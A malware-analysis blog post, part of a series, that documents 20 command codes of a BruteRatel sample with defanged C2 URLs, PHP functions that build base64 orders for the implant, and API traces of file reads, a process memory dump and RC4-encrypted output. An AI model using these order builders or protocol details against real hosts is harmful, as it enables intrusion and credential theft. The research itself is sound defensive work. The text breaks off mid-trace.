---
title: "BruteRatel full command analysis (5/X)"
date: 2025-04-10 
---

<link rel="stylesheet" href="/css/main.css">

## BRUTERATEL COMMAND LIST PART 5 

## Context  

BruteRatel SHA256 : d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1  

Sample Source :  
[bazaar.abuse.ch](https://bazaar.abuse.ch/sample/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1/)   

VirusTotal :  
[VirusTotal](https://www.virustotal.com/gui/file/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1)  

Network / C2 :  
http://tiguanin[.]com/bazar.php:8041  
http://tiguanin[.]com/admin.php:8041  
http://bazarunet[.]com/admin.php:8041  
http://bazarunet[.]com/bazar.php:8041  
http://greshunka[.]com/bazar.php:8041  
http://greshunka[.]com/admin.php:8041  

# INTRO  

This article is the 5th part of my full analysis of BruteRatel commands : [Previous Part](https://cedricg-mirror.github.io/2025/03/28/BruteRatel4.html)  

This detailed analysis will be split into several parts, I will be presenting in this post the next 20 commands that BruteRatel can respond to.  

# COMMAND LIST

Here is a short description of the next 20 command codes and purpose :  

| Command ID   | Description             | Parameter         |
| :----------- | :---------------------- | :----------------:|
|"\x9a\xe1"    | [GetFullPathNameW](#GetFullPathNameW) | $filename |
|"\x57\xa6"    | [inet_ntoa](#inet_ntoa) | $host |
|"\xf1\xa5"    | [dump_process_from_pid](#dump_process_from_pid) | $pid |
|"\x63\xd1"    | [adjustTokenPrivilege](#adjustTokenPrivilege) | $privilege |
|"\x3a\xe5"    | [GetFileTimeStamp](#GetFileTimeStamp) | $filename |
|"\xd3\xb1"    | [WbemCreateProcess](#WbemCreateProcess) | $CommandLine |
|"\x3e\xf8"    | [listdir2](#listdir2) | $dir_path |
|"\xb9\xe4"    | [GetDelegationToken](#GetDelegationToken) | $TargetName |
|"\x3a\xb9"    | [ping](#ping) | $host |
|"\x9c\xda"    | [GetCredentialsFromUiPrompt](#GetCredentialsFromUiPrompt) | $CaptionText |
|"\xe4\xcd"    | [GetThreadsInfo](#GetThreadsInfo) | $pid |
|"\xba\xe1"    | [InjectSetContext](#InjectSetContext) | $pid, $tid |
|"\xed\xf2"    | [connect_localhost_global_struct](#connect_localhost_global_struct) | $index |
|"\xd8\x3b"    | [WriteMemory](#WriteMemory) | $address, $data |
|"\x3b\xa2"    | [GetUsersPwdHashes](#GetUsersPwdHashes) | NA |
|"\xd2\xe3"    | [CreateProcessConf3](#CreateProcessConf3) | TODO |
|"\xd9\xa7"    | [unknown_update_global_struct](#unknown_update_global_struct) | TODO |
|"\xb3\xd2"    | [StopService](#StopService) | $MachineName, $ServiceName |
|"\x9a\x6c"    | [DelayCmdExec](#DelayCmdExec) | $delay |
|"\xd1\xf3"    | [unknown_network](#unknown_network) | $ip, $port, $unknown, $unknown2 |

In the following section, I share some dynamic analysis results from the aforementioned commands :  

<a id="GetFullPathNameW"></a>
# GetFullPathNameW  

```php
/*
	Retrieve the full path from the given file,
	Read up to 0x2000 bytes and report the result up to the first null bytes read
  ex : GetFullPathNameW("autorunsc64.exe");
*/
function GetFullPathNameW($filename)
{
	$filenameW = UConverter::transcode($filename, 'UTF-16LE', 'UTF-8');
	$filename_b64 = base64_encode($filenameW);
	$cmd_id = "\x9a\xe1 $filename_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [665]
[PTP] [0xdac] [0xdc4] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000097DDD05A50
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+ef7QSMkOGDv2whCCK1hp61d+fGo6tPXyFLn0PSInEbGKFVnnuaxmWZuzXPGFDrHRILADuba+VvMEebzkWP7ie4FQ"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x00000097DDD18E80
[PAR] DWORD   *pcbBinary : 0x00000097DFCFED0C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x97dfc5bea1]
```

**II. Execution**   

```html
[CNT] [675]
[PTP] [0xdac] [0xdc4] [c:\windows\system32\rundll32.exe]
[API] <GetFullPathNameW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpFileName    : 0x00000097DDD22060
[STR]         -> "autorunsc64.exe"
[PAR] DWORD   nBufferLength : 0x104
[PAR] LPWSTR  lpBuffer      : 0x00000097DFCEEA20
[PAR] LPWSTR* lpFilePart    : 0x0
[RET] [0x97dfc67036]

[CNT] [686]
[PTP] [0xdac] [0xdc4] [c:\windows\system32\rundll32.exe]
[API] <RtlDosPathNameToNtPathName_U> in [ntdll.dll] 
[PAR] PCWSTR               DosPathName    : 0x00000097DFCEEA20
[STR]                      -> "C:\Users\user\Desktop\Samples\BRUTERATEL\autorunsc64.exe"
[PAR] PUNICODE_STRING      NtPathName     : 0x00000097DFCEE9C0
[PAR] PCWSTR*              NtFileNamePart : 0x0
[PAR] PRTL_RELATIVE_NAME_U DirectoryInfo  : 0x0
[RET] [0x97dfc67095]

[CNT] [687]
[PTP] [0xdac] [0xdc4] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenFile> in [ntdll.dll] 
[PAR] PHANDLE            FileHandle       : 0x00000097DFCEE9B0
[PAR] ACCESS_MASK        DesiredAccess    : 0x120089 (FILE_GENERIC_READ)
[PAR] POBJECT_ATTRIBUTES ObjectAttributes : 0x00000097DFCEE9F0
[FLD]                    -> ObjectName = "\??\C:\Users\user\Desktop\Samples\BRUTERATEL\autorunsc64.exe"
[PAR] PIO_STATUS_BLOCK  IoStatusBlock     : 0x00000097DFCEE9D0
[PAR] ULONG             ShareAccess       : 0x1 (FILE_SHARE_READ)
[PAR] ULONG             OpenOptions       : 0x60 (FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE)
[RET] [0x97dfc74a05]

[CNT] [688]
[PTP] [0xdac] [0xdc4] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtReadFile> in [ntdll.dll] 
[PAR] HANDLE           FileHandle      : 0x2f8
[PAR] HANDLE           Event           : 0x0
[PAR] PIO_APC_ROUTINE  ApcRoutine      : 0x0
[PAR] PVOID            ApcContext      : 0x0
[PAR] PIO_STATUS_BLOCK IoStatusBlock   : 0x00000097DFCEE9E0
[PAR] PVOID            Buffer          : 0x00000097DFCEEC28
[PAR] ULONG            Length          : 0x2000
[PAR] PLARGE_INTEGER   ByteOffset      : 0x00000097DFCEE9B8
[PAR] PULONG           Key             : 0x0
[RET] [0x97dfc75162]
```

**III. Result**   

Since the queried file is a PE, first NULL byte is encountered right after the 'MZ' magic.   

```html
[CNT] [694]
[PTP] [0xdac] [0xdc4] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x00000097DDD04CB0
[STR]        -> "9AE1"
[STR]           "C:\Users\user\Desktop\Samples\BRUTERATEL\autorunsc64.exe"
[STR]           "MZ"
[PAR] DWORD  cbBinary   : 0x84
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000097DDD14D00
[PAR] DWORD* pcchString : 0x00000097DFCEE8BC
[RET] [0x97dfc5e028]
```

<a id="inet_ntoa"></a>
# inet_ntoa  

```php
// ex : inet_ntoa("tiguanin.com");
function inet_ntoa($host)
{
	$cmd_id = "\x57\xa6 $host";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [361]
[PTP] [0x91c] [0x10e0] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000035A2FD46E0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+Qr3MSPofMhbfwBC+H1ob92p8DytHwdzTJtM="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x00000035A2FDE670
[PAR] DWORD   *pcbBinary : 0x00000035A4FFE78C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x35a4f5bea1]
```

**II. Execution**   

```html
[CNT] [374]
[PTP] [0x91c] [0x10e0] [c:\windows\system32\rundll32.exe]
[API] <WSAStartup> in [ws2_32.dll] 
[PAR] WORD wVersionRequested : 0x202
[RET] [0x35a4f63fcd]

[CNT] [375]
[PTP] [0x91c] [0x10e0] [c:\windows\system32\rundll32.exe]
[API] <gethostbyname> in [ws2_32.dll] 
[PAR] PCHAR name : 0x00000035A2FE1060
[STR]       -> "tiguanin.com"
[RET] [0x35a4f63fe5]

[CNT] [384]
[PTP] [0x91c] [0x10e0] [c:\windows\system32\rundll32.exe]
[API] <inet_ntoa> in [ws2_32.dll] 
[PAR] struct in_addr in : 0x2e8ffea9
            -> 169.254.143.46
[RET] [0x35a4f6402b]
```

**III. Result**   

```html
[CNT] [395]
[PTP] [0x91c] [0x10e0] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x00000035A2FF7300
[STR]        -> "57A6"
[STR]           "tiguanin.com 169.254.143.46"
[PAR] DWORD  cbBinary   : 0x40
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000035A2FC41C0
[PAR] DWORD* pcchString : 0x00000035A4FFE44C
[RET] [0x35a4f5e028]
```

<a id="dump_process_from_pid"></a>
# dump_process_from_pid  

```php
// ex : dump_process_from_pid("4064");
function dump_process_from_pid($pid)
{
	$cmd_id = "\xf1\xa5 $pid";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [242]
[PTP] [0x12ac] [0xec0] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000005A57FC7A10
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+LOrASNAcH0r11mv2Ui1u9VBz"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000005A57FEB680
[PAR] DWORD   *pcbBinary : 0x0000005A59FDEC0C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x5a59f3bea1]
```

**II. Execution**   

```html
[CNT] [262]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcess> in [ntdll.dll] 
[PAR] PHANDLE             ProcessHandle    : 0x0000005A5A54F330
[PAR] ACCESS_MASK         DesiredAccess    : 0x410 (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
[PAR] POBJECT_ATTRIBUTES  ObjectAttributes : 0x0000005A5A54F3C0
[PAR] PCLIENT_ID          ClientId         : 0x0000005A5A54F3A0
[FLD]                    -> UniqueProcess = 0xfe0
[FLD]                    -> UniqueThread  = 0x0
[RET] [0x5a59f54aab]

[CNT] [263]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtCreateTransaction> in [ntdll.dll] 
[PAR] PHANDLE             TransactionHandle : 0x0000005A5A54F340
[PAR] ACCESS_MASK         DesiredAccess     : 0x1f003f (TRANSACTION_ALL_ACCESS)
[PAR] POBJECT_ATTRIBUTES  ObjectAttributes  : 0x0000005A5A54F3C0
[PAR] LPGUID              Uow               : 0x0
[PAR] HANDLE              TmHandle          : 0x0
[PAR] ULONG               CreateOptions     : 0x0
[PAR] ULONG               IsolationLevel    : 0x0
[PAR] ULONG               IsolationFlags    : 0x0
[PAR] HANDLE              TmHandle          : 0x0
[PAR] HANDLE              TmHandle          : 0x0
[RET] [0x5a59f54587]

[CNT] [264]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[API] <RtlSetCurrentTransaction> in [ntdll.dll] 
[PAR] HANDLE TransactionHandle : 0x304
[RET] [0x5a59f473f3]

[CNT] [265]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[API] <RtlInitUnicodeString> in [ntdll.dll] 
[PAR] PCWSTR SourceString : 0x0000005A57FC83D0
[STR]        -> "\??\C:\Users\Public\cache"
[RET] [0x5a59f474b8]

[CNT] [266]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtCreateFile> in [ntdll.dll] 
[PAR] PHANDLE            FileHandle       : 0x0000005A5A54F338
[PAR] ACCESS_MASK        DesiredAccess    : 0x12019f (FILE_GENERIC_READ | FILE_GENERIC_WRITE)
[PAR] POBJECT_ATTRIBUTES ObjectAttributes : 0x0000005A5A54F3C0
[FLD]                    -> ObjectName = "\??\C:\Users\Public\cache"
[PAR] PIO_STATUS_BLOCK  IoStatusBlock     : 0x0000005A5A54F390
[PAR] PLARGE_INTEGER    AllocationSize    : 0x0000005A5A54F370
[PAR] ULONG             FileAttributes    : 0x80
[PAR] ULONG             ShareAccess       : 0x3 (FILE_SHARE_READ | FILE_SHARE_WRITE)
[PAR] ULONG             CreateDisposition : 0x5 (FILE_DOES_NOT_EXIST)
[PAR] ULONG             CreateOptions     : 0x20 (FILE_SYNCHRONOUS_IO_NONALERT)
[RET] [0x5a59f5421a]

[ * ] [pid 0x12ac][tid 0xde0] c:\windows\system32\rundll32.exe
[EVT] [Kernel Monitoring]
[MSG] [FILE_CREATED] [C:\Users\Public\cache]

[CNT] [267]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[API] <RtlSetCurrentTransaction> in [ntdll.dll] 
[PAR] HANDLE TransactionHandle : 0x0
[RET] [0x5a59f4757b]

[CNT] [288]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[API] <SymInitializeW> in [dbghelp.dll] 
[PAR] HANDLE hProcess       : 0x300 
[PAR] PWSTR  UserSearchPath : 0x0 (null)
[PAR] BOOL   fInvadeProcess : 0x1
[RET] [0x5a59f4ebe0]

[CNT] [293]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtQuerySystemInformation> in [ntdll.dll] 
[PAR] SYSTEM_INFORMATION_CLASS SystemInformationClass  : 0x5 (SystemProcessInformation)
[PAR] PVOID                    SystemInformation       : 0x0000005A5BAB4100
[PAR] ULONG                    SystemInformationLength : 0x10000
[PAR] PULONG                   ReturnLength            : 0x0
[RET] [0x5a59f54f0d]

[CNT] [294]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[API] <EnumerateLoadedModulesW64> in [dbghelp.dll] 
[PAR] HANDLE                          hProcess                  : 0x300 
[PAR] PENUMLOADED_MODULES_CALLBACKW64 EnumLoadedModulesCallback : 0x0000005A59F3E100
[PAR] PVOID                           UserContext               : 0x0000005A5A54F1F0
[RET] [0x5a59f4ec9c]

[CNT] [295]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[API] <GetModuleFileNameExW> in [PSAPI.DLL] 
[PAR] HANDLE  hProcess   : 0x300 
[PAR] HMODULE hModule    : 0x00007FF6E4970000 
[PAR] LPWSTR  lpFilename : 0x0000005A5B44A73C
[PAR] DWORD   nSize      : 0x104
[RET] [0x5a59f397f2]

[CNT] [296]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[API] <GetModuleFileNameExW> in [PSAPI.DLL] 
[PAR] HANDLE  hProcess   : 0x300 
[PAR] HMODULE hModule    : 0x00007FFE281C0000 (ntdll.dll)
[PAR] LPWSTR  lpFilename : 0x0000005A5B44A964
[PAR] DWORD   nSize      : 0x104
[RET] [0x5a59f397f2]

[CNT] [297]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[API] <GetModuleFileNameExW> in [PSAPI.DLL] 
[PAR] HANDLE  hProcess   : 0x300 
[PAR] HMODULE hModule    : 0x00007FFE26240000 (KERNEL32.DLL)
[PAR] LPWSTR  lpFilename : 0x0000005A5B44AB8C
[PAR] DWORD   nSize      : 0x104
[RET] [0x5a59f397f2]

[...]

[CNT] [447]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringA> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000005A57FEB530
[STR]        -> "28-03-2025_14-46-57_4064.dmp"
[PAR] DWORD  cbBinary   : 0x1c
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPSTR  pszString  : 0x0000005A57FC83D0
[PAR] DWORD* pcchString : 0x0000005A5A54F19C
[RET] [0x5a59f3e0b1]
```

**III. Result**   

```html
[CNT] [453]
[PTP] [0x12ac] [0xde0] [c:\windows\system32\rundll32.exe]
[API] <SystemFunction032> in [CRYPTSP.DLL] 
[INF] [ Undocumented RC4 implementation ]
[PAR] PBINARY_STRING buffer : 0x0000005A5A54F140
[FLD]                -> Length    = 0xa6b2b
[FLD]                -> MaxLength = 0xa6b2b
[FLD]                -> Buffer    = 0x0000005A5AD50080
[STR]                -> "{"cds":{"auth":"OV1T557KBIUECUM5"},"dt":{"chkin":"TURNUJOnAAAEAAAAIAAAAAAAAABaAAAAAgAAAAAAAAAHAAAAOAAAAFAAAAAEAAAAhA0AAI"
[STR]                   "wAAAAJAAAAwBoAAAgYAAAAAAAAAAAAAAAAAAAJAAYACToCAQYAAAADAAAAgCUAAAIAAACIAAAAEAAAAEx3wgAAAAAAAAAAAAAAAAAA4fNZWgAAAAAAAAAgAA"
[STR]                   "AAAACX5PZ/AAAAkA4AU0EOAIhMUFQQDgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAcKP5/AAAAwBoAvMYaAJ5VUFRODgAAvQTv/gAAAQADAAYAB0SAJQMABgAHRIAlPwAAAAAAAAAEAAQAAgAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkJv5/AAAA4BMA7A8UAMpUUFSODgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABJJf5/AAAAUBEAXE0RADdXUFTUDgAAvQTv/gAAAQADAA"
[STR]                   "YAB0SAJQMABgAHRIAlPwAAAAAAAAAEAAQAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADJJv5/AAAAkFEBSzNUAU"
[STR]                   "A9UFQeDwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
[STR]                   "AAAACfJf5/AAAAQAUAJ74FAGM6UFRiDwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAADWGP5/AAAAABsAYPAaAG1AUFSmDwAAvQTv/gAAAQADAAYAB0SAJQMABgAHRIAlPwAAAAAAAAAEAAQAAgAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC+Jv5/AAAAoAoAMGgLABFUUFSSEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXJv5/AAAAEAwAmtUMAK1CUFTYEAAAAAAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD4I/5/AAAAkBIAXTkSAA"
[STR]                   "BWUFQeEQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
[STR]                   [TRUNCATED]
[PAR] PBINARY_STRING key    : 0x0000005A5A54F130
[FLD]                -> Length    = 0x10
[FLD]                -> MaxLength = 0x10
[FLD]                -> Buffer    = 0x0000005A57FACBA0
[STR]                -> "S47EFEUO3D2O6641"
[RET] [0x5a59f24c35]
```

<a id="adjustTokenPrivilege"></a>
# adjustTokenPrivilege  

```php
// ex: adjustTokenPrivilege("SeCreateTokenPrivilege");
function adjustTokenPrivilege($privilege)
{
	$cmd_id = "\x63\xd1 $privilege";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [341]
[PTP] [0xbdc] [0xb64] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000D86C8C9A00
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+TbLQSMtqCDzY+gCjGkp511F8QjMJjd/dJLbkIxEON52CdFWYweFDbLXL"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000D86C8B2660
[PAR] DWORD   *pcbBinary : 0x000000D86E8AE5BC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xd86e80bea1]
```

**II. Execution**   

```html
[CNT] [348]
[PTP] [0xbdc] [0xb64] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcessToken> in [ntdll.dll] 
[PAR] HANDLE      ProcessHandle : 0xFFFFFFFFFFFFFFFF
[PAR] ACCESS_MASK DesiredAccess : 0x28 (TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES)
[PAR] PHANDLE     TokenHandle   : 0x000000D86E8AE4B8
[RET] [0xd86e824b2f]

[CNT] [349]
[PTP] [0xbdc] [0xb64] [c:\windows\system32\rundll32.exe]
[API] <LookupPrivilegeValueA> in [ADVAPI32.dll] 
[PAR] LPCTSTR lpSystemName : 0x0 (null)
[PAR] LPCTSTR lpName       : 0x000000D86C8D35D0
[STR]         -> "SeCreateTokenPrivilege"
[RET] [0xd86e809926]

[CNT] [350]
[PTP] [0xbdc] [0xb64] [c:\windows\system32\rundll32.exe]
[API] <AdjustTokenPrivileges> in [ADVAPI32.dll] 
[PAR] HANDLE            TokenHandle          : 0x324
[PAR] BOOL              DisableAllPrivileges : 0x0
[PAR] PTOKEN_PRIVILEGES NewState             : 0x000000D86E8AE4CC
[PAR] DWORD             BufferLength         : 0x10
[PAR] PTOKEN_PRIVILEGES PreviousState        : 0x0
[PAR] PDWORD            ReturnLength         : 0x0
[RET] [0xd86e809966]

[CNT] [351]
[PTP] [0xbdc] [0xb64] [c:\windows\system32\rundll32.exe]
[API] <LookupPrivilegeValueA> in [ADVAPI32.dll] 
[PAR] LPCTSTR lpSystemName : 0x0 (null)
[PAR] LPCTSTR lpName       : 0x000000D86C8D35D0
[STR]         -> "SeCreateTokenPrivilege"
[RET] [0xd86e80997a]

[CNT] [352]
[PTP] [0xbdc] [0xb64] [c:\windows\system32\rundll32.exe]
[API] <PrivilegeCheck> in [ADVAPI32.dll] 
[PAR] HANDLE         ClientToken        : 0x324
[PAR] PPRIVILEGE_SET RequiredPrivileges : 0x000000D86E8AE4DC
[PAR] LPBOOL         pfResult           : 0x000000D86E8AE4AC
[RET] [0xd86e8099c0]
```

<a id="GetFileTimeStamp"></a>
# GetFileTimeStamp  

```php
// ex : GetFileTimeStamp("autorunsc64.exe");
function GetFileTimeStamp($filename)
{
	$filenameW = UConverter::transcode($filename, 'UTF-16LE', 'UTF-8');
	$filename_b64 = base64_encode($filenameW);
	$cmd_id = "\x3a\xe5 $filename_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [242]
[PTP] [0x1100] [0x117c] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000003032C11490
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+W/7ASMkOGDv2whCCK1hp61d+fGo6tPXyFLn0PSInEbGKFVnnuaxmWZuzXPGFDrHRILADuba+VvMEebzkWP7ie4FQ"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000003032C35F90
[PAR] DWORD   *pcbBinary : 0x0000003034C4E98C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x3034babea1]
```

**II. Execution**   

```html
[CNT] [405]
[PTP] [0x924] [0xa84] [c:\windows\system32\rundll32.exe]
[API] <GetFullPathNameW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpFileName    : 0x000000C9BBE7F660
[STR]         -> "autorunsc64.exe"
[PAR] DWORD   nBufferLength : 0x104
[PAR] LPWSTR  lpBuffer      : 0x000000C9BDE6E380
[PAR] LPWSTR* lpFilePart    : 0x0
[RET] [0xc9bddce349]

[CNT] [406]
[PTP] [0x924] [0xa84] [c:\windows\system32\rundll32.exe]
[API] <RtlDosPathNameToNtPathName_U> in [ntdll.dll] 
[PAR] PCWSTR               DosPathName    : 0x000000C9BDE6E380
[STR]                      -> "C:\Users\eglantine\Desktop\Samples\BRUTERATEL\autorunsc64.exe"
[PAR] PUNICODE_STRING      NtPathName     : 0x000000C9BDE6E2D8
[PAR] PCWSTR*              NtFileNamePart : 0x0
[PAR] PRTL_RELATIVE_NAME_U DirectoryInfo  : 0x0
[RET] [0xc9bddce372]

[CNT] [407]
[PTP] [0x924] [0xa84] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenFile> in [ntdll.dll] 
[PAR] PHANDLE            FileHandle       : 0x000000C9BDE6E2C8
[PAR] ACCESS_MASK        DesiredAccess    : 0x120089 (FILE_GENERIC_READ)
[PAR] POBJECT_ATTRIBUTES ObjectAttributes : 0x000000C9BDE6E318
[FLD]                    -> ObjectName = "\??\C:\Users\eglantine\Desktop\Samples\BRUTERATEL\autorunsc64.exe"
[PAR] PIO_STATUS_BLOCK  IoStatusBlock     : 0x000000C9BDE6E2E8
[PAR] ULONG             ShareAccess       : 0x1 (FILE_SHARE_READ)
[PAR] ULONG             OpenOptions       : 0x60 (FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE)
[RET] [0xc9bdde4a05]

[CNT] [408]
[PTP] [0x924] [0xa84] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtQueryInformationFile> in [ntdll.dll] 
[PAR] HANDLE                 FileHandle           : 0x2f4
[PAR] PIO_STATUS_BLOCK       IoStatusBlock        : 0x000000C9BDE6E2F8
[PAR] PVOID                  FileInformation      : 0x000000C9BDE6E348
[PAR] ULONG                  Length               : 0x38
[PAR] FILE_INFORMATION_CLASS FileInformationClass : 0x22 (FileNetworkOpenInformation)
[RET] [0xc9bdde4d0a]

[CNT] [423]
[PTP] [0x924] [0xa84] [c:\windows\system32\rundll32.exe]
[API] <FileTimeToLocalFileTime> in [KERNEL32.DLL] 
[RET] [0xc9bddce4e7]

[CNT] [424]
[PTP] [0x924] [0xa84] [c:\windows\system32\rundll32.exe]
[API] <FileTimeToSystemTime> in [KERNEL32.DLL] 
[RET] [0xc9bddce4fc]

[...]
```

**III. Result**   

```html
[CNT] [556]
[PTP] [0x924] [0xa84] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000C9BBE7EA10
[STR]        -> "3AE5"
[STR]           "C:\Users\eglantine\Desktop\Samples\BRUTERATEL\autorunsc64.exe"
[STR]           "806912"
[STR]           "AA 09/04/2025 02:17:0"
[STR]           "AB 09/04/2025 02:17:0"
[STR]           "AC 22/10/2024 01:18:28"
[STR]           "AD 09/04/2025 02:16:44"
[PAR] DWORD  cbBinary   : 0x148
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000C9BBE51AF0
